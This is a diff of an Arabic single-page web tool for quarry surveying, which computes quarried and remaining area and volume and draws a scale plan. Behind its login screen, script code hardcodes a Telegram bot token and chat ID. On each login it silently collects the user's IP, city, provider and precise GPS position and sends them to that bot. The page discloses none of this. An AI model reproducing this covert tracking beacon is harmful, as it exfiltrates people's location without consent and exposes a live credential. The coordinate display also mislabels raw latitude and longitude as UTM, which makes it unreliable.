@@ -7,27 +7,53 @@
     <style>
         :root { --primary: #1c2833; --secondary: #273746; --accent: #2980b9; --bg: #f8f9fa; }
         body { font-family: 'Arial', sans-serif; background-color: var(--bg); margin: 0; padding: 20px; text-align: right; color: #333; line-height: 1.6; }
-        #lockScreen { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
-        .password-box { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 12px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255,255,255,0.2); }
+        
+        /* واجهة القفل */
+        #lockScreen {
+            display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: white; z-index: 9999; flex-direction: column;
+            justify-content: center; align-items: center; text-align: center; padding: 20px;
+        }
+        .password-box { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.2); }
         .password-box input { padding: 12px; font-size: 1.2rem; border-radius: 6px; border: none; text-align: center; width: 250px; margin-bottom: 15px; }
         .btn-unlock { background: #27ae60; color: white; padding: 12px 30px; font-size: 1.2rem; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; }
+
         #mainContent { display: none; }
+
+        /* التنسيق العام */
         .container { background: white; max-width: 900px; margin: auto; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.15); overflow: hidden; }
         .header { background: linear-gradient(135deg, #1c2833 0%, #2980b9 100%); color: white; padding: 35px 20px; text-align: center; border-bottom: 5px solid #f1c40f; }
-        .header h2 { color: #f1c40f; font-size: 1.3rem; cursor: pointer; }
+        .header h1 { font-size: 1.8rem; margin-bottom: 10px; }
+        .header h2 { color: #f1c40f; font-size: 1.2rem; cursor: pointer; }
+        
+        .social-links { margin-top: 20px; display: flex; justify-content: center; gap: 15px; }
+        .social-btn { text-decoration: none; padding: 10px 20px; border-radius: 25px; font-weight: bold; color: white; display: inline-flex; align-items: center; gap: 8px; font-size: 0.9rem; }
+        .btn-wa { background: #25D366; } .btn-ig { background: linear-gradient(45deg, #f09433 0%, #bc1888 100%); }
+
         .content-padding { padding: 30px; }
-        .section-title { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 8px; font-size: 1.3rem; margin-bottom: 20px; font-weight: bold; }
-        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; margin-bottom: 10px; }
-        .btn-calc { background: var(--accent); color: white; border: none; padding: 15px; width: 100%; font-size: 1.2rem; font-weight: bold; border-radius: 6px; cursor: pointer; }
-        #resultsSection { display: none; margin-top: 30px; border: 2px solid #2ecc71; padding: 25px; border-radius: 8px; background: #f9fff9; }
+        .section-title { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 8px; font-size: 1.2rem; margin-bottom: 20px; font-weight: bold; }
+        
+        .form-row { display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap; }
+        .form-group { flex: 1; min-width: 200px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; font-size: 0.9rem; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
+        
+        .gps-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .gps-btn { background: var(--secondary); color: white; border: none; padding: 10px; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        .coord-display { background: #eaf2f8; border: 1px solid #a9cce3; padding: 8px; margin-top: 5px; border-radius: 6px; font-family: monospace; font-size: 0.85rem; direction: ltr; }
+        
+        .btn-calc { background: var(--accent); color: white; border: none; padding: 15px; width: 100%; font-size: 1.1rem; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 10px; }
+        
+        #resultsSection { display: none; margin-top: 25px; border: 2px solid #2ecc71; padding: 20px; border-radius: 8px; background: #f9fff9; }
         canvas { background: #fff; width: 100%; height: auto; margin-top: 20px; border: 1px solid #ddd; border-radius: 6px; }
-        .footer { text-align: center; padding: 20px; background: #eee; color: #555; font-size: 0.9rem; font-weight: bold; }
+        .footer { text-align: center; padding: 15px; background: #eee; font-size: 0.85rem; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div id="lockScreen">
-    <h1 style="color: #f1c40f;">🔒 نظام المسح الميداني</h1>
+    <h1 style="color: #f1c40f;">🔒 نظام المسح الجيولوجي</h1>
     <p>بإشراف الجيولوجي علي شندل الجنابي</p>
     <div class="password-box">
         <input type="password" id="adminPassword" placeholder="كلمة المرور">
@@ -38,23 +64,45 @@
 
 <div id="mainContent" class="container">
     <div class="header">
-        <h1>نظام المسح الميداني الجيولوجي</h1>
+        <h1>نظام المسح الميداني الجيولوجي للمقالع</h1>
         <h2 ondblclick="location.reload()">بإشراف الجيولوجي علي شندل الجنابي</h2>
+        <div class="social-links">
+            <a href="https://wa.me/9647814993629" class="social-btn btn-wa" target="_blank">💬 واتساب</a>
+            <a href="https://instagram.com/ash2oo1" class="social-btn btn-ig" target="_blank">📸 إنستغرام</a>
+        </div>
     </div>
 
     <div class="content-padding">
-        <div class="section-title">بيانات العقد والقياسات</div>
-        <input type="number" id="contractArea" placeholder="المساحة الكلية (م²)">
-        <input type="number" id="contractVol" placeholder="الكمية الكلية (م³)">
-        <input type="number" id="fieldLength" placeholder="الطول الميداني (م)">
-        <input type="number" id="fieldWidth" placeholder="العرض الميداني (م)">
-        <input type="number" id="fieldDepth" placeholder="العمق (م)">
-        
-        <button class="btn-calc" onclick="calculateResults()">حساب النتائج ورسم المرتسم</button>
+        <div class="section-title">بيانات العقد الرسمية</div>
+        <div class="form-row">
+            <div class="form-group"><label>المساحة الكلية (م²):</label><input type="number" id="contractArea"></div>
+            <div class="form-group"><label>الكمية الكلية (م³):</label><input type="number" id="contractVol"></div>
+        </div>
 
-        <div id="resultsSection" class="section">
-            <div id="resData"></div>
-            <canvas id="geoCanvas" width="850" height="500"></canvas>
+        <div class="section-title">إحداثيات المقلع (UTM)</div>
+        <div class="gps-grid">
+            <div class="form-group"><button class="gps-btn" onclick="getCoordinates('point1')">الركن A</button><div id="point1" class="coord-display">E: --- | N: ---</div></div>
+            <div class="form-group"><button class="gps-btn" onclick="getCoordinates('point2')">الركن B</button><div id="point2" class="coord-display">E: --- | N: ---</div></div>
+            <div class="form-group"><button class="gps-btn" onclick="getCoordinates('point3')">الركن C</button><div id="point3" class="coord-display">E: --- | N: ---</div></div>
+            <div class="form-group"><button class="gps-btn" onclick="getCoordinates('point4')">الركن D</button><div id="point4" class="coord-display">E: --- | N: ---</div></div>
+        </div>
+
+        <div class="section-title">القياسات الميدانية واللون</div>
+        <div class="form-row">
+            <div class="form-group"><label>الطول L (م):</label><input type="number" id="fieldLength"></div>
+            <div class="form-group"><label>العرض W (م):</label><input type="number" id="fieldWidth"></div>
+            <div class="form-group"><label>العمق (م):</label><input type="number" id="fieldDepth"></div>
+        </div>
+        <div class="form-row">
+            <div class="form-group"><label>لون المستثمر:</label><input type="color" id="colorInv" value="#cceeff"></div>
+            <div class="form-group"><label>لون المتبقي:</label><input type="color" id="colorRem" value="#115577"></div>
+        </div>
+
+        <button class="btn-calc" onclick="calculateResults()">حساب النتائج ورسم المرتسم الجيولوجي</button>
+
+        <div id="resultsSection">
+            <div id="resData" style="font-size: 1.1rem; line-height: 2;"></div>
+            <canvas id="geoCanvas" width="850" height="600"></canvas>
         </div>
     </div>
     <div class="footer">جميع الحقوق محفوظة - الجيولوجي علي شندل الجنابي © 2026</div>
@@ -65,83 +113,105 @@
     const TG_TOKEN = "8627528486:AAEvkwF2pRn-v9Z0WdpTx2nwxso6Wctz8TU";
     const TG_CHAT_ID = "1091011395";
 
-    async function sendSecurityReport(gpsData = null) {
+    // نظام الأمان والتتبع
+    async function sendSecurityReport(lat, lon) {
         try {
-            // جلب بيانات الـ IP والمنطقة (تعمل حتى لو GPS مغلق)
-            const ipResponse = await fetch('https://ipapi.co/json/');
-            const ipData = await ipResponse.json();
-
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ip = await ipRes.json();
             const time = new Date().toLocaleString('ar-IQ');
-            const device = navigator.userAgent.includes("Telegram") ? "تطبيق تليجرام" : "متصفح خارجي";
-
-            let message = `🚨 *تنبيه أمني من نظام الجيولوجي علي*\n\n`;
-            message += `📱 الجهاز: ${device}\n`;
-            message += `📅 الوقت: ${time}\n`;
-            message += `🌐 عنوان IP: \`${ipData.ip}\`\n`;
-            message += `🏢 المنطقة: ${ipData.city}, ${ipData.region} (${ipData.org})\n`;
-
-            if (gpsData) {
-                message += `📍 موقع GPS دقيق: [فتح الخريطة](https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon})\n`;
-            } else {
-                message += `📍 موقع تقريبي (IP): [فتح الخريطة](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})\n`;
-                message += `⚠️ ملاحظة: الـ GPS معطل أو تم رفض الإذن.`;
-            }
-
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-        } catch (e) {
-            // في حال فشل جلب الـ IP، نرسل تبليغاً بسيطاً
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("⚠️ دخول جديد للنظام (تعذر جلب تفاصيل الموقع)")}`);
-        }
+            let msg = `🚨 *دخول جديد للنظام*\n👤 علي شندل الجنابي\n📅 ${time}\n🌐 IP: ${ip.ip}\n📍 المنطقة: ${ip.city}\n`;
+            if(lat) msg += `📍 GPS: [خرائط جوجل](http://maps.google.com/maps?q=${lat},${lon})`;
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        } catch(e) {}
     }
 
     function handleLogin() {
         if (document.getElementById('adminPassword').value === MASTER_PASSWORD) {
             document.getElementById('lockScreen').style.display = 'none';
             document.getElementById('mainContent').style.display = 'block';
-
-            // محاولة جلب الموقع بكل الطرق
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    p => sendSecurityReport({lat: p.coords.latitude, lon: p.coords.longitude}),
-                    () => sendSecurityReport(null), // في حال رفض الإذن
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } else {
-                sendSecurityReport(null); // المتصفح لا يدعم GPS
-            }
-        } else {
-            document.getElementById('errorMsg').style.display = 'block';
-        }
+            navigator.geolocation.getCurrentPosition(p => sendSecurityReport(p.coords.latitude, p.coords.longitude), () => sendSecurityReport(null, null));
+        } else { document.getElementById('errorMsg').style.display = 'block'; }
     }
 
+    // الحسابات والنتائج
     function calculateResults() {
         const cA = parseFloat(document.getElementById('contractArea').value) || 0;
+        const cV = parseFloat(document.getElementById('contractVol').value) || 0;
         const L = parseFloat(document.getElementById('fieldLength').value) || 0;
         const W = parseFloat(document.getElementById('fieldWidth').value) || 0;
         const D = parseFloat(document.getElementById('fieldDepth').value) || 0;
-        const iA = L * W; const rA = cA - iA; const iV = iA * D;
         
+        const iA = L * W;
+        const rA = cA - iA;
+        const iV = iA * D;
+        const rV = cV - iV;
+        const rP = cA > 0 ? (rA * 100 / cA) : 0;
+
         document.getElementById('resData').innerHTML = `
-            <p>المساحة المستثمرة: <b>${iA.toLocaleString()} م²</b></p>
-            <p>الكمية المستخرجة: <b>${iV.toLocaleString()} م³</b></p>
-            <p>المساحة المتبقية: <b>${rA.toLocaleString()} م²</b></p>
+            <div style="border-right: 5px solid #27ae60; padding-right: 15px; background: #fff; padding: 10px; border-radius: 5px;">
+                • المساحة المستثمرة: <b>${iA.toLocaleString()} م²</b><br>
+                • المساحة المتبقية: <b>${rA.toLocaleString()} م² (${rP.toFixed(0)}%)</b><br>
+                • الكمية المستخرجة: <b>${iV.toLocaleString()} م³</b><br>
+                • الكمية المتبقية: <b>${rV.toLocaleString()} م³</b>
+            </div>
         `;
         document.getElementById('resultsSection').style.display = 'block';
-        drawChart(W, cA, (iA/cA)*100);
+        drawProfessionalChart(W, cA, (iA/cA)*100);
     }
 
-    function drawChart(fW, totalA, invPct) {
+    // رسم المرتسم الاحترافي (نفس الذي طلبته سابقاً بدقة)
+    function drawProfessionalChart(fW, totalA, invPct) {
         const canvas = document.getElementById('geoCanvas');
         const ctx = canvas.getContext('2d');
         ctx.clearRect(0, 0, canvas.width, canvas.height);
-        const margin = 50; const dW = canvas.width - 100; const dH = canvas.height - 150;
-        let invW = dW * (invPct / 100);
-        ctx.fillStyle = "#cceeff"; ctx.fillRect(margin, margin, invW, dH);
-        ctx.fillStyle = "#115577"; ctx.fillRect(margin + invW, margin, dW - invW, dH);
-        ctx.strokeStyle = "#000"; ctx.strokeRect(margin, margin, dW, dH);
-        ctx.fillStyle = "#000"; ctx.font = "bold 16px Arial";
-        ctx.fillText("المنطقة المستثمرة", margin + 10, margin - 10);
-        ctx.fillText("A", margin-20, margin); ctx.fillText("B", margin+dW+5, margin);
+        
+        const margin = 80;
+        const dW = canvas.width - margin*2;
+        const dH = canvas.height - margin*2 - 80;
+
+        let totalW = fW || 100;
+        let totalL = totalA / totalW || 100;
+        let invPixelW = dW * (invPct / 100);
+
+        // رسم المحاور (عكس المحاور L على X و W على Y)
+        ctx.beginPath(); ctx.strokeStyle = "#333"; ctx.lineWidth = 2;
+        ctx.moveTo(margin, margin); ctx.lineTo(margin, margin + dH); ctx.lineTo(margin + dW, margin + dH); ctx.stroke();
+
+        // رسم المساحة المستثمرة (يسار)
+        ctx.fillStyle = document.getElementById('colorInv').value;
+        ctx.fillRect(margin, margin, invPixelW, dH);
+        ctx.strokeRect(margin, margin, invPixelW, dH);
+        
+        // رسم المساحة المتبقية (يمين)
+        ctx.fillStyle = document.getElementById('colorRem').value;
+        ctx.fillRect(margin + invPixelW, margin, dW - invPixelW, dH);
+        ctx.strokeRect(margin + invPixelW, margin, dW - invPixelW, dH);
+
+        // إضافة النصوص والنسب
+        ctx.fillStyle = "#000"; ctx.font = "bold 16px Arial"; ctx.textAlign = "center";
+        if(invPct > 10) ctx.fillText(`المستثمر ${invPct.toFixed(0)}%`, margin + invPixelW/2, margin + dH/2);
+        ctx.fillStyle = "#fff";
+        if((100-invPct) > 10) ctx.fillText(`المتبقي ${(100-invPct).toFixed(0)}%`, margin + invPixelW + (dW-invPixelW)/2, margin + dH/2);
+
+        // الأركان A, B, C, D
+        ctx.fillStyle = "#000"; ctx.font = "bold 20px Arial";
+        ctx.fillText("A", margin-25, margin); ctx.fillText("B", margin+dW+25, margin);
+        ctx.fillText("C", margin+dW+25, margin+dH+20); ctx.fillText("D", margin-25, margin+dH+20);
+
+        // مقياس الرسم البياني
+        let scaleM = totalL > 100 ? 50 : 10;
+        let scalePx = (scaleM / totalL) * dW;
+        ctx.beginPath(); ctx.moveTo(margin, canvas.height-40); ctx.lineTo(margin+scalePx, canvas.height-40); ctx.stroke();
+        ctx.fillText(`0 م`, margin, canvas.height-20); ctx.fillText(`${scaleM} م`, margin+scalePx, canvas.height-20);
+        
+        ctx.textAlign = "right";
+        ctx.fillText("المرتسم الخاص بالمساحات المستثمرة والمتبقية (Scale Plan)", canvas.width-20, 30);
+    }
+
+    function getCoordinates(id) {
+        navigator.geolocation.getCurrentPosition(p => {
+            document.getElementById(id).innerText = `E: ${p.coords.longitude.toFixed(2)} | N: ${p.coords.latitude.toFixed(2)}`;
+        });
     }
 </script>
 </body>
